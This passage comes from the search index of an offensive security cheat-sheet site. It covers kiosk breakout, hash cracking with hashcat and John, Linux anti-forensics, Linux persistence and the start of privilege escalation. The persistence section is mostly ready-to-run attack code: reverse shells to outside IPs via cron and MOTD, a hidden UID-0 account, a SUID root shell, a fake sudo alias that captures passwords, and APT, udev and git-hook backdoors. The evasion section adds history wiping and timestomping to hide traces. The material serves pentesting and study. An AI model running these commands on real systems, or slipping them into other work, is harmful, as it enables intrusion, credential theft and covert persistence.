Center\"</li> <li>You land on \"Setup Sticky Keys\", move up a level on \"Ease of Access Center\"</li> <li>Start the OSK (On-Screen-Keyboard)</li> <li>You can now use the keyboard shortcut (CTRL+N)</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#dialog-boxes","title":"Dialog Boxes","text":""},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#creating-new-files","title":"Creating new files","text":"<ul> <li>Batch files \u2013 Right click &gt; New &gt; Text File &gt; rename to .BAT (or .CMD) &gt; edit &gt; open</li> <li>Shortcuts \u2013 Right click &gt; New &gt; Shortcut &gt; <code>%WINDIR%\\system32</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#open-a-new-windows-explorer-instance","title":"Open a new Windows Explorer instance","text":"<ul> <li>Right click any folder &gt; select <code>Open in new window</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#exploring-context-menus","title":"Exploring Context Menus","text":"<ul> <li>Right click any file/folder and explore context menus</li> <li>Clicking <code>Properties</code>, especially on shortcuts, can yield further access via <code>Open File Location</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#save-as","title":"Save as","text":"<ul> <li>\"Save as\" / \"Open as\" option</li> <li>\"Print\" feature \u2013 selecting \"print to file\" option (XPS/PDF/etc)</li> <li><code>\\\\127.0.0.1\\c$\\Windows\\System32\\</code> and execute <code>cmd.exe</code></li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#input-boxes","title":"Input Boxes","text":"<p>Many input boxes accept file paths; try all inputs with UNC paths such as <code>//attacker\u2013pc/</code> or <code>//127.0.0.1/c$</code> or <code>C:\\</code></p>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#bypass-file-restrictions","title":"Bypass file restrictions","text":"<p>Enter . or *.exe or similar in <code>File name</code> box</p>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#internet-explorer","title":"Internet Explorer","text":""},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#download-and-runopen","title":"Download and Run/Open","text":"<ul> <li>Text files -&gt; opened by Notepad</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#menus","title":"Menus","text":"<ul> <li>The address bar</li> <li>Search menus</li> <li>Help menus</li> <li>Print menus</li> <li>All other menus that provide dialog boxes</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#accessing-filesystem","title":"Accessing filesystem","text":"<p>Enter these paths in the address bar:</p> <ul> <li>file://C:/windows</li> <li>C:/windows/</li> <li>%HOMEDRIVE%</li> <li>\\127.0.0.1\\c$\\Windows\\System32</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#unassociated-protocols","title":"Unassociated Protocols","text":"<p>It is possible to escape a browser based kiosk with other protocols than usual <code>http</code> or <code>https</code>.  If you have access to the address bar, you can use any known protocol (<code>irc</code>, <code>ftp</code>, <code>telnet</code>, <code>mailto</code>, etc.)  to trigger the open with prompt and select a program installed on the host. The program will than be launched with the uri as a parameter, you need to select a program that will not crash when recieving it. It is possible to send multiple parameters to the program by adding spaces in your uri.</p> <p>Note: This technique required that the protocol used is not already associated with a program.</p> <p>Example - Launching Firefox with a custom profile:</p> <p>This is a nice trick since Firefox launched with the custom profile may not be as much hardened as the default profile.</p> <ol> <li>Firefox need to be installed.</li> <li>Enter the following uri in the address bar: <code>irc://127.0.0.1 -P \"Test\"</code></li> <li>Press enter to navigate to the uri.</li> <li>Select the firefox program.</li> <li>Firefox will be launched with the profile <code>Test</code>. </li> </ol> <p>In this example, it's the equivalent of running the following command: <pre><code>firefox irc://127.0.0.1 -P \"Test\"\n</code></pre></p>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#shell-uri-handlers","title":"Shell URI Handlers","text":"<ul> <li>shell:DocumentsLibrary</li> <li>shell:Librariesshell:UserProfiles</li> <li>shell:Personal</li> <li>shell:SearchHomeFolder</li> <li>shell:System shell:NetworkPlacesFolder</li> <li>shell:SendTo</li> <li>shell:Common Administrative Tools</li> <li>shell:MyComputerFolder</li> <li>shell:InternetFolder</li> </ul>"},{"location":"Methodology%20and%20Resources/Escape%20Breakout/#references","title":"References","text":"<ul> <li>PentestPartners - Breaking out of Citrix and other restricted desktop environments</li> <li>Breaking Out! of Applications Deployed via Terminal Services, Citrix, and Kiosks - Scott Sutherland - May 22nd, 2013</li> <li>Escaping from KIOSKs - HackTricks</li> <li>Breaking out of Windows Kiosks using only Microsoft Edge - Firat Acar - May 24, 2022</li> <li>HOW TO LAUNCH COMMAND PROMPT AND POWERSHELL FROM MS PAINT - 2022-05-14 - Rickard</li> </ul>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/","title":"Hash Cracking","text":""},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#summary","title":"Summary","text":"<ul> <li>Hashcat</li> <li>Hashcat Example Hashes</li> <li>Hashcat Install</li> <li>Mask attack</li> <li>Dictionary</li> <li>John</li> <li>Usage</li> <li>Rainbow tables</li> <li>Tips and Tricks</li> <li>Online Cracking Resources</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#hashcat","title":"Hashcat","text":""},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#hashcat-install","title":"Hashcat Install","text":"<pre><code>apt install cmake build-essential -y\napt install checkinstall git -y\ngit clone https://github.com/hashcat/hashcat.git &amp;&amp; cd hashcat &amp;&amp; make -j 8 &amp;&amp; make install\n</code></pre> <ol> <li>Extract the hash</li> <li>Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes</li> <li>Establish a cracking stratgy based on hash format (ex: wordlist -&gt; wordlist + rules -&gt; mask -&gt; combinator mode -&gt; prince attack -&gt; ...)</li> <li>Enjoy plains</li> <li>Review strategy</li> <li>Start over</li> </ol>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#dictionary","title":"Dictionary","text":"<p>Every word of a given list (a.k.a. dictionary) is hashed and compared against the target hash.</p> <pre><code>hashcat --attack-mode 0 --hash-type $number $hashes_file $wordlist_file -r $my_rules\n</code></pre> <ul> <li> <p>Wordlists</p> <ul> <li>packetstorm</li> <li>weakpass_3a</li> <li>weakpass_3</li> <li>Hashes.org</li> <li>kerberoast_pws</li> <li>hashmob.net</li> <li>clem9669/wordlists</li> </ul> </li> <li> <p>Rules</p> <ul> <li>One Rule to Rule Them All</li> <li>nsa-rules</li> <li>hob064</li> <li>d3adhob0</li> <li>clem9669/hashcat-rule</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#mask-attack","title":"Mask attack","text":"<p>Mask attack is an attack mode which optimize brute-force.</p> <p>Every possibility for a given character set and a given length (i.e. aaa, aab, aac, ...) is hashed and compared against the target hash.</p> <pre><code># Mask: upper*1+lower*5+digit*2 and upper*1+lower*6+digit*2 \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?l?l?d?d?1 \n# Mask: upper*1+lower*3+digit*4 and upper*1+lower*3+digit*4\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?d?d?d?d\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?d?d?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?u?l?l?l?l?d?d?d?d?1\n# Mask: lower*6 + digit*2 + special digit(+!?*)\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 \"*+!??\" ?l?l?l?l?l?l?d?d?1?1\n# Mask: lower*6 + digit*2\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 /content/hashcat/masks/8char-1l-1u-1d-1s-compliant.hcmask\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 -1 ?l?d?u ?1?1?1?1?1?1?1?1\n# Other examples\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a?a\nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?a?a?a?a?a?a?a?a \nhashcat -m 1000 --status --status-timer 300 -w 4 -O /content/*.ntds -a 3 ?u?l?l?l?l?l?l?d?d?d?d\nhashcat --attack-mode 3 --increment --increment-min 4 --increment-max 8 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a?a?a?a?a\"\nhashcat --attack-mode 3 --hash-type $number $hashes_file \"?u?l?l?l?d?d?d?d?s\"\nhashcat --attack-mode 3 --hash-type $number $hashes_file \"?a?a?a?a?a?a?a?a\"\nhashcat --attack-mode 3 --custom-charset1 \"?u\" --custom-charset2 \"?l?u?d\" --custom-charset3 \"?d\" --hash-type $number $hashes_file \"?1?2?2?2?3\"\n</code></pre> Shortcut Characters ?l abcdefghijklmnopqrstuvwxyz ?u ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d 0123456789 ?s !\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[]^_`{}~ ?a ?l?u?d?s ?b 0x00 - 0xff"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#john","title":"John","text":""},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#john-usage","title":"John Usage","text":"<pre><code># Run on password file containing hashes to be cracked\njohn passwd\n\n# Use a specific wordlist\njohn --wordlist=&lt;wordlist&gt; passwd\n\n# Use a specific wordlist with rules\njohn --wordlist=&lt;wordlist&gt; passwd --rules=Jumbo\n\n# Show cracked passwords\njohn --show passwd\n\n# Restore interrupted sessions\njohn --restore\n</code></pre>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#rainbow-tables","title":"Rainbow tables","text":"<p>The hash is looked for in a pre-computed table. It is a time-memory trade-off that allows cracking hashes faster, but costing a greater amount of memory than traditional brute-force of dictionary attacks. This attack cannot work if the hashed value is salted (i.e. hashed with an additional random value as prefix/suffix, making the pre-computed table irrelevant)</p>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#tips-and-tricks","title":"Tips and Tricks","text":"<ul> <li>Cloud GPU<ul> <li>penglab - Abuse of Google Colab for cracking hashes. \ud83d\udc27</li> <li>google-colab-hashcat - Google colab hash cracking</li> <li>Cloudtopolis - Zero Infrastructure Password Cracking</li> <li>Nephelees - also a NTDS cracking tool abusing Google Colab</li> </ul> </li> <li>Build a rig on premise<ul> <li>Pentester's Portable Cracking Rig - $1000</li> <li>How To Build A Password Cracking Rig - 5000$</li> </ul> </li> <li>Online cracking<ul> <li>Hashes.com</li> <li>hashmob.net: great community with Discord</li> </ul> </li> <li>Use the <code>loopback</code> in combination with rules and dictionary to keep cracking until you don't find new passsword: <code>hashcat --loopback --attack-mode 0 --rules-file $rules_file --hash-type $number $hashes_file $wordlist_file</code></li> <li>PACK (Password Analysis and Cracking Kit)<ul> <li>https://github.com/iphelix/pack/blob/master/README</li> <li>Can produce custom hcmask files to use with hashcat, based on statistics and rules applied on an input dataset</li> </ul> </li> <li>Use Deep Learning<ul> <li>brannondorsey/PassGAN</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#online-cracking-resources","title":"Online Cracking Resources","text":"<ul> <li>hashes.com</li> <li>crackstation</li> <li>Hashmob</li> </ul>"},{"location":"Methodology%20and%20Resources/Hash%20Cracking/#references","title":"References","text":"<ul> <li>Cracking - The Hacker Recipes</li> <li>Using Hashcat to Crack Hashes on Azure</li> <li>miloserdov.org hashcat</li> <li>miloserdov.org john</li> <li>DeepPass \u2014 Finding Passwords With Deep Learning - Will Schroeder - Jun 1</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/","title":"Linux - Evasion","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/#summary","title":"Summary","text":"<ul> <li>File names</li> <li>Command history</li> <li>Hiding text</li> <li>Timestomping</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/#file-names","title":"File Names","text":"<p>An Unicode zero-width space can be inserted into filenames which makes the names visually indistinguishable:</p> <pre><code># A decoy file with no special characters\ntouch 'index.php'\n# An imposter file with visually identical name\ntouch $'index\\u200D.php'\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/#command-history","title":"Command History","text":"<p>Most shells save their command history so a user can recall them again later.  The command history can be viewed with the <code>history</code> command or by manually inspecting the contents of the file pointed to by <code>$HISTFILE</code> (e.g. <code>~/.bash_history</code>). This can be prevented in a number of ways.</p> <pre><code># Prevent writing to the history file at all\nunset HISTFILE\n\n# Don't save this session's command history in memory\nexport HISTSIZE=0\n</code></pre> <p>Individual commands that match a pattern in <code>HISTIGNORE</code> will be excluded from the command history, regardless of <code>HISTFILE</code> or <code>HISTSIZE</code> settings. By default, <code>HISTIGNORE</code> will ignore all commands that begin with whitespace:</p> <pre><code># Note the leading space character:\nmy-sneaky-command\n</code></pre> <p>If commands are accidentally added to the command history, individual command entries can be removed with <code>history -d</code>:</p> <pre><code># Removes the most recently logged command.\n# Note that we actually have to delete two history entries at once,\n# otherwise the `history -d` command itself will be logged as well.\nhistory -d -2 &amp;&amp; history -d -1\n</code></pre> <p>The entire command history can be purged as well, although this approach is much less subtle and very likely to be noticed:</p> <pre><code># Clears the in-memory history and writes the empty history to disk.\nhistory -c &amp;&amp; history -w\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/#hiding-text","title":"Hiding Text","text":"<p>ANSI escape sequences can be abused to hide text under certain circumstances. If the file's contents are printed to the terminal (e.g. <code>cat</code>, <code>head</code>, <code>tail</code>) then the text will be hidden. If the file is viewed with an editor (e.g. <code>vim</code>, <code>nano</code>, <code>emacs</code>), then the escape sequences will be visible.</p> <pre><code>echo \"sneaky-payload-command\" &gt; script.sh\necho \"# $(clear)\" &gt;&gt; script.sh\necho \"# Do not remove. Generated from /etc/issue.conf by configure.\" &gt;&gt; script.sh\n\n# When printed, the terminal will be cleared and only the last line will be visible:\ncat script.sh\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/#timestomping","title":"Timestomping","text":"<p>Timestomping refers to the alteration of a file or directory's modification/access timestamps in order to conceal the fact that it was modified. The simplest way to accomplish this is with the <code>touch</code> command:</p> <pre><code># Changes the access (-a) and modification (-m) times using YYYYMMDDhhmm format.\ntouch -a -m -t 202210312359 \"example\"\n# Changes time using a Unix epoch timestamp.\ntouch -a -m -d @1667275140 \"example\"\n# Copies timestamp from one file to another.\ntouch -a -m -r \"other_file\" \"example\"\n# Get the file's modification timestamp, modify the file, then restore the timestamp.\nMODIFIED_TS=$(stat --format=\"%Y\" \"example\")\necho \"backdoor\" &gt;&gt; \"example\"\ntouch -a -m -d @$MODIFIED_TS \"example\"\n</code></pre> <p>It should be noted that <code>touch</code> can only modify the access and modification timestamps.  It can't be used to update a file's \"change\" or \"birth\" timestamps.  The birth timestamp, if supported by the filesystem, tracks when the file was created.  The change timestamp tracks whenever the file's metadata changes, including updates to the access and modification timestamps.</p> <p>If an attacker has root privileges, they can work around this limitation by modifying the system clock, creating or modifying a file, then reverting the system clock:</p> <pre><code>ORIG_TIME=$(date)\ndate -s \"2022-10-31 23:59:59\"\ntouch -a -m \"example\"\ndate -s \"${ORIG_TIME}\"\n</code></pre> <p>Don't forget that creating a file also updates the parent directory's modification timestamp as well!</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Evasion/#references","title":"References","text":"<ul> <li>ATT&amp;CK - Impair Defenses: Impair Command History Logging</li> <li>ATT&amp;CK - Indicator Removal: Timestomp</li> <li>ATT&amp;CK - Indicator Removal on Host: Clear Command History</li> <li>ATT&amp;CK - Masquerading: Match Legitimate Name or Location</li> <li>Wikipedia - ANSI escape codes</li> <li>InverseCos - Detecting Linux Anti-Forensics: Timestomping</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/","title":"Linux - Persistence","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#summary","title":"Summary","text":"<ul> <li>Basic reverse shell</li> <li>Add a root user</li> <li>Suid Binary</li> <li>Crontab - Reverse shell</li> <li>Backdooring a user's bash_rc</li> <li>Backdooring a startup service</li> <li>Backdooring a user startup file</li> <li>Backdooring Message of the Day</li> <li>Backdooring a driver</li> <li>Backdooring the APT</li> <li>Backdooring the SSH</li> <li>Backdooring Git</li> <li>Additional Linux Persistence Options</li> <li>References</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#basic-reverse-shell","title":"Basic reverse shell","text":"<pre><code>ncat --udp -lvp 4242\nncat --sctp -lvp 4242\nncat --tcp -lvp 4242\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#add-a-root-user","title":"Add a root user","text":"<pre><code>sudo useradd -ou 0 -g 0 john\nsudo passwd john\necho \"linuxpassword\" | passwd --stdin john\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#suid-binary","title":"Suid Binary","text":"<pre><code>TMPDIR2=\"/var/tmp\"\necho 'int main(void){setresuid(0, 0, 0);system(\"/bin/sh\");}' &gt; $TMPDIR2/croissant.c\ngcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2&gt;/dev/null\nrm $TMPDIR2/croissant.c\nchown root:root $TMPDIR2/croissant\nchmod 4777 $TMPDIR2/croissant\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#crontab-reverse-shell","title":"Crontab - Reverse shell","text":"<pre><code>(crontab -l ; echo \"@reboot sleep 200 &amp;&amp; ncat 192.168.1.2 4242 -e /bin/bash\")|crontab 2&gt; /dev/null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-users-bash_rc","title":"Backdooring a user's bash_rc","text":"<p>(FR/EN Version)</p> <pre><code>TMPNAME2=\".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0\"\ncat &lt;&lt; EOF &gt; /tmp/$TMPNAME2\n  alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \\$locale  = \"en\" ]; then echo -n \"[sudo] password for \\$USER: \";fi;if [ \\$locale  = \"fr\" ]; then echo -n \"[sudo] Mot de passe de \\$USER: \";fi;read -s pwd;echo; unalias sudo; echo \"\\$pwd\" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash &gt; /dev/null &amp;&amp; /usr/bin/sudo -S '\nEOF\nif [ -f ~/.bashrc ]; then\ncat /tmp/$TMPNAME2 &gt;&gt; ~/.bashrc\nfi\nif [ -f ~/.zshrc ]; then\ncat /tmp/$TMPNAME2 &gt;&gt; ~/.zshrc\nfi\nrm /tmp/$TMPNAME2\n</code></pre> <p>or add the following line inside its .bashrc file.</p> <pre><code>$ chmod u+x ~/.hidden/fakesudo\n$ echo \"alias sudo=~/.hidden/fakesudo\" &gt;&gt; ~/.bashrc\n</code></pre> <p>and create the <code>fakesudo</code> script.</p> <pre><code>read -sp \"[sudo] password for $USER: \" sudopass\necho \"\"\nsleep 2\necho \"Sorry, try again.\"\necho $sudopass &gt;&gt; /tmp/pass.txt\n/usr/bin/sudo $@\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-startup-service","title":"Backdooring a startup service","text":"<ul> <li>Edit <code>/etc/network/if-up.d/upstart</code> file   <pre><code>RSHELL=\"ncat $LMTHD $LHOST $LPORT -e \\\"/bin/bash -c id;/bin/bash\\\" 2&gt;/dev/null\"\nsed -i -e \"4i \\$RSHELL\" /etc/network/if-up.d/upstart\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-message-of-the-day","title":"Backdooring Message of the Day","text":"<ul> <li>Edit <code>/etc/update-motd.d/00-header</code> file   <pre><code>echo 'bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1\"' &gt;&gt; /etc/update-motd.d/00-header\n</code></pre></li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-user-startup-file","title":"Backdooring a user startup file","text":"<p>Linux, write a file in  <code>~/.config/autostart/NAME_OF_FILE.desktop</code></p> <pre><code>In : ~/.config/autostart/*.desktop\n[Desktop Entry]\nType=Application\nName=Welcome\nExec=/var/lib/gnome-welcome-tour\nAutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide\nOnlyShowIn=GNOME;\nX-GNOME-Autostart-enabled=false\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-a-driver","title":"Backdooring a driver","text":"<pre><code>echo \"ACTION==\\\"add\\\",ENV{DEVTYPE}==\\\"usb_device\\\",SUBSYSTEM==\\\"usb\\\",RUN+=\\\"$RSHELL\\\"\" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules &gt; /dev/null\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-the-apt","title":"Backdooring the APT","text":"<p>If you can create a file on the apt.conf.d directory with: <code>APT::Update::Pre-Invoke {\"CMD\"};</code> Next time \"apt-get update\" is done, your CMD will be executed!</p> <pre><code>echo 'APT::Update::Pre-Invoke {\"nohup ncat -lvp 1234 -e /bin/bash 2&gt; /dev/null &amp;\"};' &gt; /etc/apt/apt.conf.d/42backdoor\n</code></pre>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-the-ssh","title":"Backdooring the SSH","text":"<p>Add an ssh key into the <code>~/.ssh</code> folder.</p> <ol> <li><code>ssh-keygen</code></li> <li>write the content of <code>~/.ssh/id_rsa.pub</code> into <code>~/.ssh/authorized_keys</code></li> <li>set the right permission, 700 for ~/.ssh and 600 for authorized_keys</li> </ol>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#backdooring-git","title":"Backdooring Git","text":"<p>Backdooring git can be a useful way to obtain persistence without the need for root access. Special care must be taken to ensure that the backdoor commands create no output, otherwise the persistence is trivial to notice.</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#git-configs","title":"Git Configs","text":"<p>There are multiple git config variables that execute arbitrary commands when certain actions are taken. As an added bonus, git configs can be specified multiple ways leading to additional backdoor opportunities. Configs can be set at the user level (<code>~/.gitconfig</code>), at the repository level (<code>path/to/repo/.git/config</code>), and sometimes via environment variables.</p> <p><code>core.editor</code> is executed whenever git needs to provide the user with an editor (e.g. <code>git rebase -i</code>, <code>git commit --amend</code>). The equivalent environment variable is <code>GIT_EDITOR</code>.</p> <pre><code>[core]\neditor = nohup BACKDOOR &gt;/dev/null 2&gt;&amp;1 &amp; ${VISUAL:-${EDITOR:-emacs}}\n</code></pre> <p><code>core.pager</code> is executed whenever git needs to potentially large amounts of data (e.g. <code>git diff</code>, <code>git log</code>, <code>git show</code>). The equivalent environment variable is <code>GIT_PAGER</code>.</p> <pre><code>[core]\npager = nohup BACKDOOR &gt;/dev/null 2&gt;&amp;1 &amp; ${PAGER:-less}\n</code></pre> <p><code>core.sshCommand</code> is executed whenever git needs to interact with a remote ssh repository (e.g. <code>git fetch</code>, <code>git pull</code>, <code>git push</code>). The equivalent environment variable is <code>GIT_SSH</code> or <code>GIT_SSH_COMMAND</code>.</p> <pre><code>[core]\nsshCommand = nohup BACKDOOR &gt;/dev/null 2&gt;&amp;1 &amp; ssh\n[ssh]\nvariant = ssh\n</code></pre> <p>Note that <code>ssh.variant</code> (<code>GIT_SSH_VARIANT</code>) is technically optional, but without it git will run <code>sshCommand</code> twice in rapid succession.  (The first run is to determine the SSH variant and the second to pass it the correct parameters.)</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#git-hooks","title":"Git Hooks","text":"<p>Git hooks are programs you can place in a hooks directory to trigger actions at certain points during git's execution. By default, hooks are stored in a repository's <code>.git/hooks</code> directory and are run when their name matches the current git action and the hook is marked as executable (i.e. <code>chmod +x</code>). Potentially useful hook scripts to backdoor:</p> <ul> <li><code>pre-commit</code> is run just before <code>git commit</code> is executed.</li> <li><code>pre-push</code> is run just before <code>git push</code> is executed.</li> <li><code>post-checkout</code> is run just after <code>git checkout</code> is executed.</li> <li><code>post-merge</code> is run after <code>git merge</code> or after <code>git pull</code> applies new changes.</li> </ul> <p>In addition to spawning a backdoor, some of the above hooks can be used to sneak malicious changes into a repo without the user noticing.</p> <p>Lastly, it is possible to globally backdoor all of a user's git hooks by setting the <code>core.hooksPath</code> git config variable to a common directory in the user-level git config file (<code>~/.gitconfig</code>).  Note that this approach will break any existing repository-specific git hooks.</p>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#additional-persistence-options","title":"Additional Persistence Options","text":"<ul> <li>SSH Authorized Keys</li> <li>Compromise Client Software Binary</li> <li>Create Account</li> <li>Create Account: Local Account</li> <li>Create or Modify System Process</li> <li>Create or Modify System Process: Systemd Service</li> <li>Event Triggered Execution: Trap </li> <li>Event Triggered Execution</li> <li>Event Triggered Execution: .bash_profile and .bashrc</li> <li>External Remote Services</li> <li>Hijack Execution Flow</li> <li>Hijack Execution Flow: LD_PRELOAD</li> <li>Pre-OS Boot</li> <li>Pre-OS Boot: Bootkit</li> <li>Scheduled Task/Job </li> <li>Scheduled Task/Job: At (Linux)</li> <li>Scheduled Task/Job: Cron</li> <li>Server Software Component</li> <li>Server Software Component: SQL Stored Procedures</li> <li>Server Software Component: Transport Agent </li> <li>Server Software Component: Web Shell </li> <li>Traffic Signaling</li> <li>Traffic Signaling: Port Knocking</li> <li>Valid Accounts: Default Accounts </li> <li>Valid Accounts: Domain Accounts 2</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Persistence/#references","title":"References","text":"<ul> <li>@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289</li> <li>https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/</li> <li>http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html</li> <li>http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/</li> <li>Pouki from JDI</li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/","title":"Linux - Privilege Escalation","text":""},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Checklist</li> <li>Looting for passwords<ul> <li>Files containing passwords</li> <li>Old passwords in /etc/security/opasswd</li> <li>Last edited files</li> <li>In memory passwords</li> <li>Find sensitive files</li> </ul> </li> <li>SSH Key<ul> <li>Sensitive files</li> <li>SSH Key Predictable PRNG (Authorized_Keys) Process</li> </ul> </li> <li>Scheduled tasks<ul> <li>Cron jobs</li> <li>Systemd timers</li> </ul> </li> <li>SUID<ul> <li>Find SUID binaries</li> <li>Create a SUID binary</li> </ul> </li> <li>Capabilities<ul> <li>List capabilities of binaries</li> <li>Edit capabilities</li> <li>Interesting capabilities</li> </ul> </li> <li>SUDO<ul> <li>NOPASSWD</li> <li>LD_PRELOAD and NOPASSWD</li> <li>Doas</li> <li>sudo_inject</li> <li>CVE-2019-14287</li> </ul> </li> <li>GTFOBins</li> <li>Wildcard</li> <li>Writable files<ul> <li>Writable /etc/passwd</li> <li>Writable /etc/sudoers</li> </ul> </li> <li>NFS Root Squashing</li> <li>Shared Library<ul> <li>ldconfig</li> <li>RPATH</li> </ul> </li> <li>Groups<ul> <li>Docker</li> <li>LXC/LXD</li> </ul> </li> <li>Hijack TMUX session</li> <li>Kernel Exploits<ul> <li>CVE-2022-0847 (DirtyPipe) </li> <li>CVE-2016-5195 (DirtyCow)</li> <li>CVE-2010-3904 (RDS)</li> <li>CVE-2010-4258 (Full Nelson)</li> <li>CVE-2012-0056 (Mempodipper)</li> </ul> </li> </ul>"},{"location":"Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/#tools","title":"Tools","text":"<p>There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escalation vectors. Here are a few:</p> <ul> <li> <p>LinPEAS - Linux Privilege Escalation Awesome Script</p> <pre><code>wget \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -O linpeas.sh\ncurl \"https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\" -o linpeas.sh\n./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.\n./linpeas.sh -s #superfast &amp; stealth - This will bypass some time consuming checks. In stealth mode Nothing will be written to the disk.\n./linpeas.sh -P #Password - Pass a password that will be used with sudo -l and bruteforcing other users\n</code></pre> </li> <li> <p>LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs</p> <pre><code>wget \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -O lse.sh\ncurl \"https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh\" -o 